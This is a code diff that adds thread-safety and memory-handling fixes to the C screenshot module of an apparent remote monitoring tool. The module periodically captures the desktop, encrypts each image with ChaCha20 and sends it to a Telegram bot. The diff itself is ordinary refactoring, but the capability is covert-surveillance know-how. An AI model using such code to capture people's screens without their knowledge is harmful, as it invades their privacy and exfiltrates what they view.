@@ -117,9 +117,10 @@ static VOID c2t_WakeConditionVariable(PCONDITION_VARIABLE ConditionVariable) {
 static atomic_int is_paused = 0;
 static atomic_uint_fast64_t total_captures = 0;
 static atomic_uint_fast64_t total_bytes = 0;
-static size_t screenshot_interval_seconds = 0;
+static atomic_size_t screenshot_interval_seconds = 0;
+static atomic_int stopping = 0;
+static atomic_int capture_in_progress = 0;
 
-static volatile int stopping = 0;
 static int initialized = 0;
 static int worker_running = 0;
 
@@ -159,8 +160,22 @@ int screenshot_capture_display_and_send(const char *display_target, const char *
     screenshot_get_selected_display(target, sizeof(target));
   }
 
+  /* A periodic capture and an on-demand command may arrive together. Keeping
+   * only one capture in flight avoids duplicate desktop/API work and caps the
+   * screenshot subsystem at one frame buffer. */
+  int expected_idle = 0;
+  if (!atomic_compare_exchange_strong_explicit(
+          &capture_in_progress, &expected_idle, 1, memory_order_acquire,
+          memory_order_relaxed)) {
+    c2t_log_warning("screenshot",
+                    "Capture request for '%s' skipped: another capture is in progress",
+                    target);
+    return 0;
+  }
+
   if (!screenshot_capture_display(target, &image_data, &image_size, &mime_type, &filename)) {
     c2t_log_warning("screenshot", "Screenshot capture failed for target '%s'", target);
+    atomic_store_explicit(&capture_in_progress, 0, memory_order_release);
     return 0;
   }
 
@@ -187,28 +202,21 @@ int screenshot_capture_display_and_send(const char *display_target, const char *
     c2t_log_error("screenshot", "Failed to generate random crypto nonce for screenshot");
     c2t_secure_zero(image_data, image_size);
     screenshot_free_data(image_data);
+    atomic_store_explicit(&capture_in_progress, 0, memory_order_release);
     return 0;
   }
 
-  void *encrypted_data = malloc(image_size);
-  if (!encrypted_data) {
-    c2t_log_error("screenshot", "Out of memory allocating encrypted screenshot buffer (%zu bytes)", image_size);
-    c2t_secure_zero(image_data, image_size);
-    screenshot_free_data(image_data);
-    return 0;
-  }
-
-  if (!c2t_crypto_encrypt(image_data, image_size, nonce, encrypted_data)) {
+  /* ChaCha20 supports identical input/output buffers. Encrypting the encoded
+   * image in place removes a full image-sized allocation and immediately
+   * replaces every plaintext byte before the network operation starts. */
+  if (!c2t_crypto_encrypt(image_data, image_size, nonce, image_data)) {
     c2t_log_error("screenshot", "ChaCha20 encryption failed for screenshot");
     c2t_secure_zero(image_data, image_size);
     screenshot_free_data(image_data);
-    free(encrypted_data);
+    c2t_secure_zero(nonce, sizeof(nonce));
+    atomic_store_explicit(&capture_in_progress, 0, memory_order_release);
     return 0;
   }
-
-  /* Securely wipe plaintext screenshot buffer from RAM immediately */
-  c2t_secure_zero(image_data, image_size);
-  screenshot_free_data(image_data);
 
   size_t attempts = c2t_config_get()->delivery_attempts;
   if (attempts == 0) attempts = 1;
@@ -217,7 +225,7 @@ int screenshot_capture_display_and_send(const char *display_target, const char *
 
   int send_res = 0;
   for (size_t attempt = 1; attempt <= attempts; ++attempt) {
-    send_res = telegram_send_encrypted_photo(encrypted_data, image_size, nonce,
+    send_res = telegram_send_encrypted_photo(image_data, image_size, nonce,
                                              mime_type, filename, &source);
     if (send_res) {
       break;
@@ -236,8 +244,10 @@ int screenshot_capture_display_and_send(const char *display_target, const char *
     }
   }
 
-  c2t_secure_zero(encrypted_data, image_size);
-  free(encrypted_data);
+  c2t_secure_zero(image_data, image_size);
+  screenshot_free_data(image_data);
+  c2t_secure_zero(nonce, sizeof(nonce));
+  atomic_store_explicit(&capture_in_progress, 0, memory_order_release);
 
   if (send_res) {
     atomic_fetch_add_explicit(&total_captures, 1, memory_order_relaxed);
@@ -262,12 +272,18 @@ static DWORD WINAPI screenshot_worker_func([[maybe_unused]] LPVOID param)
 static void *screenshot_worker_func([[maybe_unused]] void *param)
 #endif
 {
-  c2t_log_info("screenshot", "Periodic screenshot worker started (interval=%zu s)", screenshot_interval_seconds);
+  c2t_log_info("screenshot", "Periodic screenshot worker started (interval=%zu s)",
+               atomic_load_explicit(&screenshot_interval_seconds,
+                                    memory_order_relaxed));
 
-  while (!stopping) {
+  while (!atomic_load_explicit(&stopping, memory_order_acquire)) {
 #ifdef _WIN32
     EnterCriticalSection(&mutex);
-    DWORD wait_ms = (DWORD)(screenshot_interval_seconds * 1000U);
+    size_t interval = atomic_load_explicit(&screenshot_interval_seconds,
+                                           memory_order_relaxed);
+    DWORD wait_ms = interval > (size_t)(UINT32_MAX / 1000U)
+                        ? (DWORD)UINT32_MAX
+                        : (DWORD)(interval * 1000U);
     if (wait_ms == 0) wait_ms = 60000;
     SleepConditionVariableCS(&cond_var, &mutex, wait_ms);
     LeaveCriticalSection(&mutex);
@@ -276,7 +292,8 @@ static void *screenshot_worker_func([[maybe_unused]] void *param)
     struct timeval tv;
     gettimeofday(&tv, nullptr);
     struct timespec ts;
-    size_t interval = screenshot_interval_seconds;
+    size_t interval = atomic_load_explicit(&screenshot_interval_seconds,
+                                           memory_order_relaxed);
     if (interval == 0) interval = 60;
     ts.tv_sec = tv.tv_sec + (time_t)interval;
     ts.tv_nsec = tv.tv_usec * 1000;
@@ -284,9 +301,10 @@ static void *screenshot_worker_func([[maybe_unused]] void *param)
     pthread_mutex_unlock(&mutex);
 #endif
 
-    if (stopping) break;
+    if (atomic_load_explicit(&stopping, memory_order_acquire)) break;
     if (atomic_load_explicit(&is_paused, memory_order_relaxed)) continue;
-    if (screenshot_interval_seconds == 0) continue;
+    if (atomic_load_explicit(&screenshot_interval_seconds,
+                             memory_order_relaxed) == 0) continue;
 
     (void)screenshot_capture_and_send("📸 Periodic Desktop Screenshot");
   }
@@ -315,13 +333,19 @@ int screenshot_output_init(void) {
   InitializeConditionVariable(&cond_var);
 #endif
 
-  stopping = 0;
+  atomic_store_explicit(&stopping, 0, memory_order_release);
   atomic_store_explicit(&is_paused, 0, memory_order_relaxed);
-  screenshot_interval_seconds = config->telegram_screenshot_interval_sec;
+  atomic_store_explicit(&screenshot_interval_seconds,
+                        config->telegram_screenshot_interval_sec,
+                        memory_order_relaxed);
 
-  if (config->telegram_send_screenshots || screenshot_interval_seconds > 0) {
-    if (screenshot_interval_seconds == 0) {
-      screenshot_interval_seconds = 300; /* Default 5 minutes if enabled without explicit interval */
+  if (config->telegram_send_screenshots ||
+      atomic_load_explicit(&screenshot_interval_seconds,
+                           memory_order_relaxed) > 0) {
+    if (atomic_load_explicit(&screenshot_interval_seconds,
+                             memory_order_relaxed) == 0) {
+      atomic_store_explicit(&screenshot_interval_seconds, 300,
+                            memory_order_relaxed); /* Default 5 minutes */
     }
 #ifdef _WIN32
     worker_thread = CreateThread(nullptr, 0, screenshot_worker_func, nullptr, 0, nullptr);
@@ -346,7 +370,7 @@ int screenshot_output_init(void) {
 void screenshot_output_cleanup(void) {
   if (!initialized) return;
 
-  stopping = 1;
+  atomic_store_explicit(&stopping, 1, memory_order_release);
 #ifdef _WIN32
   EnterCriticalSection(&mutex);
   WakeConditionVariable(&cond_var);
@@ -368,7 +392,7 @@ void screenshot_output_cleanup(void) {
 
   worker_running = 0;
   initialized = 0;
-  stopping = 0;
+  atomic_store_explicit(&stopping, 0, memory_order_release);
   c2t_log_info("screenshot", "Screenshot subsystem shutdown complete");
 }
 
@@ -390,7 +414,8 @@ int screenshot_toggle_paused(void) {
 }
 
 void screenshot_set_interval(size_t interval_sec) {
-  screenshot_interval_seconds = interval_sec;
+  atomic_store_explicit(&screenshot_interval_seconds, interval_sec,
+                        memory_order_relaxed);
   if (interval_sec > 0 && !worker_running && initialized) {
 #ifdef _WIN32
     worker_thread = CreateThread(nullptr, 0, screenshot_worker_func, nullptr, 0, nullptr);
@@ -416,7 +441,8 @@ void screenshot_set_interval(size_t interval_sec) {
 }
 
 size_t screenshot_get_interval(void) {
-  return screenshot_interval_seconds;
+  return atomic_load_explicit(&screenshot_interval_seconds,
+                              memory_order_relaxed);
 }
 
 uint64_t screenshot_get_total_captures(void) {
@@ -431,6 +457,8 @@ void screenshot_get_status_info(char *buffer, size_t max_len) {
   if (!buffer || max_len == 0) return;
 
   int paused = screenshot_is_paused();
+  int capturing = atomic_load_explicit(&capture_in_progress,
+                                       memory_order_acquire);
   uint64_t caps = screenshot_get_total_captures();
   uint64_t b = screenshot_get_total_bytes();
   char b_str[64] = {};
@@ -440,8 +468,9 @@ void screenshot_get_status_info(char *buffer, size_t max_len) {
   screenshot_get_selected_display(target_disp, sizeof(target_disp));
 
   char timer_info[128] = {};
-  if (screenshot_interval_seconds > 0) {
-    snprintf(timer_info, sizeof(timer_info), "🟢 <b>Enabled</b> (%zu s)", screenshot_interval_seconds);
+  size_t interval = screenshot_get_interval();
+  if (interval > 0) {
+    snprintf(timer_info, sizeof(timer_info), "🟢 <b>Enabled</b> (%zu s)", interval);
   } else {
     snprintf(timer_info, sizeof(timer_info), "⚪ <b>Disabled</b> <i>(On-demand only via /shot)</i>");
   }
@@ -455,7 +484,8 @@ void screenshot_get_status_info(char *buffer, size_t max_len) {
            "• <b>Total Screenshots Captured:</b> %llu\n"
            "• <b>Total Transferred:</b> %s",
            screenshot_get_backend_name(),
-           paused ? "⏸️ <b>PAUSED</b>" : "🟢 <b>ACTIVE</b>",
+           paused ? "⏸️ <b>PAUSED</b>"
+                  : (capturing ? "📸 <b>CAPTURING</b>" : "🟢 <b>ACTIVE</b>"),
            target_disp,
            screenshot_get_display_count(),
            timer_info,
